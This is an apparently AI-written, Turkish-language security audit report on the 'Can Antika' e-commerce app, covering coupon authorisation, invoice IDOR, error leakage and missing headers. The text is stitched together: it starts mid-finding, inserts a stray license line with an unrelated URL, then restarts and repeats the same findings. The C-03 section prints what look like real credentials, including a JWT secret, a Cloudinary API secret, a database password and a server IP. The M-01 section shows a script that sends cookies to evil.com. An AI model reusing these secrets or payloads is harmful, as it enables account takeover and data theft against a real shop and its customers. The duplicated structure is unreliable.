public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        ],
    }];
}
```


## License: unknown
https://github.com/praveenjuge/praveenjuge/blob/f7c607592efe59257f18e3337868dd9519bec159/next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
